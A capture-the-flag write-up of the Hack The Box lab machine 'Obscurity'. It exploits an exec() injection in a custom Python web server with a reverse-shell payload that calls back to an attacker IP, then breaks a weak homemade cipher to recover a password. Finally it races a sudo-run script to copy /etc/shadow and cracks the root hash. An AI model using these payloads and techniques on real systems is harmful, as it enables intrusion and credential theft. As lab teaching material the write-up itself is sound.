# Obscurity

<table>
    <tr>
    <td style="text-align:right;"><b>OS</b></td>
    <td>Linux</td>
    </tr>
    <tr>
    <td style="text-align:right;"><b>Difficulty</b></td>
    <td>Medium</td>
    </tr>
    <tr>
    <td style="text-align:right;"><b>Points</b></td>
    <td>30</td>
    </tr>
    <tr>
    <td style="text-align:right;"><b>Release</b></td>
    <td>30 Nov 2019</td>
    </tr>
    <tr>
    <td style="text-align:right;"><b>IP</b></td>
    <td>10.10.10.168</td>
    </tr>
</table>

## Foothold

To begin, we will add the entry `10.10.10.168 obscurity.htb` to `/etc/hosts` and then start scanning.

```
# nmap -sC -sV obscurity.htb 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-09 11:54 EDT
Nmap scan report for obscurity.htb (10.10.10.168)
Host is up (0.11s latency).
Not shown: 996 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
80/tcp   closed http
8080/tcp open   http-proxy BadHTTPServer
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 09 May 2020 15:58:35
|     Server: BadHTTPServer
|     Last-Modified: Sat, 09 May 2020 15:58:35
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <!-- 
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     <!-- stylesheet css -->
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/templatemo-blue.css">
|     </head>
|     <body data-spy="scroll" data-target=".navbar-collapse">
|     <!-- preloader section -->
|     <!--
|     <div class="preloader">
|_    <div class="sk-spinner sk-spinner-wordpress">
|_http-server-header: BadHTTPServer
|_http-title: 0bscura
9000/tcp closed cslistener
````

From this we see that SSH is open and HTTP is open but not on the normal port 80 but rather 8080. Port 9000 is closed. Browsing to `http://obscurity.htb:8080` we see the landing page for company *Obscura* whose motto is "Security through Obscurity".

![](images/obscura.png)

They mention that all off their software is made from scratch so that hackers will not be able to break in. This strongly suggests that we will need to implement custom exploitation and cannot rely on normal tools. Our final piece of information is that the source code of the website, `SuperSecureServer.py`, is hosted somewhere on the site in the "secret development directory".

We will attempt to locate the server code in order to try to find a weakness and exploit it. In order to find this file, we cannot use standard directory busters because the server returns a 404 error unless the exact path to a file is given. Instead, we will have to use a fuzzer.

```
# wfuzz -z file,/usr/share/wordlists/wfuzz/general/common.txt --hc 404 http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
...
===================================================================
ID           Response   Lines    Word     Chars       Payload             
===================================================================

000000259:   200        170 L    498 W    5892 Ch     "develop"
```

From this, we see that the server code is in the `develop` directory. If we browse to that file, we can download the server code and analyze it.

After looking at the code, the comments give us a clue about an unsafe call in the code.

```python
path = urllib.parse.unquote(path)
...
info = "output = 'Document: {}'" # Keep the output for later debug
exec(info.format(path)) # This is how you do string formatting, right?
```

When `exec` is called, it executes whatever is passed to it. In this case, it is setting the output variable with an insecure format call. We are able to abuse this through injection to get remote code execution and spawn a shell.

The ending single quote makes it tricky but we are able to set the output variable to our request, call arbitrary code, and set a nonsense variable to properly close the ending quote. The payload would look like this:

```python
path = "http://10.10.10.168:8080/a';{};a='a"
# Standard Python reverse shell payload
payload = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.120%22,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22])'
```

We are trying to retrieve a file called `a` which doesn't exist but it doesn't matter because we just care about the remote code execution that will take place. Normally, it would be convenient to use a short `bash` or `nc` shell but the only binary we can confirm on the system is `python3` itself. Now, we will start up a listener on our machine using `nc` and send our request with payload and we should be connected.


Start the netcat listener:
```
# nc -lvnp 1234
```

Making the request with our payload inserted:

```python
>>> import requests
>>> requests.get(path.format(payload))
```

Receiving the call back on our listener:
```
# nc -lvnp 1234
$ hostname
obscurity
```

## User

Now that we have a shell on the machine, we can begin to gather information on the system. Let's see the other users:

```
$ ls -l /home
total 4
drwxr-xr-x 7 robert robert 4096 Dec  2 09:53 robert
```

We see that there is a user Robert and we are allowed to read their home directory. Let's see if we can find anything useful.

```
$ ls -l /home/robert
total 24
drwxr-xr-x 2 root   root   4096 Dec  2 09:47 BetterSSH
-rw-rw-r-- 1 robert robert   94 Sep 26 23:08 check.txt
-rw-rw-r-- 1 robert robert  185 Oct  4 15:01 out.txt
-rw-rw-r-- 1 robert robert   27 Oct  4 15:01 passwordreminder.txt
-rwxrwxr-x 1 robert robert 2514 Oct  4 14:55 SuperSecureCrypt.py
-rwx------ 1 robert robert   33 Sep 25 14:12 user.txt
```

We see the flag but are not able to read it until we log in as Robert. There is also a BetterSSH directory that we cannot view. We will download the rest of the files and see what they are:
* `SuperSecureCrypt.py` - custom encryption/decryption of files
* `check.txt` - sample file to encrypt
* `out.txt` - sample result of encryption
* `passwordreminder.txt` - an encrypted file, supposedly his password

If we look at the encryption scheme in the crypt file, we see that it is actually quite naive.

```python
def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted
```

The entire encryption is taking each character of the input as its ASCII value, add the corresponding value from the key, and convert it back to a printable character. If the key is too short, it will wrap around. With this information, we can brute force the decryption for `out.txt` since we have `check.txt`.

```python
def brute_decrypt(text, goal):
    result = ""
    pos = 0
    for x in text:
        result += chr(ord(x)-ord(goal[pos]))
        pos += 1
    print(result)
```

Using this function, we get the result `alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal`. Since the key wraps around when it is too short, we clearly see that the real key is `alexandrovich`. Now that we have the key, it is likely that Robert uses this key to encrypt his other files.

```
# python3 SuperSecureCrypt.py -d -i passwordreminder.txt -o out -k alexandrovich
...
# cat out
SecThruObsFTW
```

Now that we have decrypted Robert's password, we can use this to SSH as him and get the flag.

```
# ssh robert@10.10.10.168
robert@10.10.10.168's password: 
...
robert@obscure:~$ cat user.txt 
e4493782066b55fe2755708736ada2d7
```

## Root

Now that we are logged in as Robert, we are able to view the BetterSSH directory that we couldn't before. It contains `BetterSSH.py`. Unfortunately, it doesn't work without root permissions. However, we are actually able to run it with sudo.

```
$ sudo -l
...
User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```

The script is opening `/etc/shadow` and reading from it and manipulating the data. A potential vulnerability in the script is that it sleeps for 0.1 seconds immediately after writing the file to `/tmp/SSH`. If we have a cleverly constructed command running in the background, we can grab the file before it is deleted almost immediately after without having to know the actual credentials.

```python
with open('/tmp/SSH/'+path, 'w') as f:
    f.write(passwordFile)
time.sleep(.1)
```

In the background we run:

```
seq 10000 | xargs -I -- sh -c 'cp /tmp/SSH/* ~ 2>/dev/null'
```

This will repeatedly try to copy our file from `/tmp/ssh` into the home directory. During the 0.1 second pause, we will be able to successfully copy it. Now we will run the script:

```
$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: robert
Enter password: anything
Incorrect pass
```

The script failed but that doesn't matter because we have copied the shadow file into the home directory! Now we can crack the root password, switch to root user, and get the flag.

```
# cat 1ohAuD3b
root
$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
18226
0
99999
7
...
# echo root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7::: > hash.txt
# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
...
mercedes         (root)
...
```

```
$ su root
Password: 
root@obscure:/home/robert# cat /root/root.txt 
512fd4429f33a113a44d5acde23609e3
```
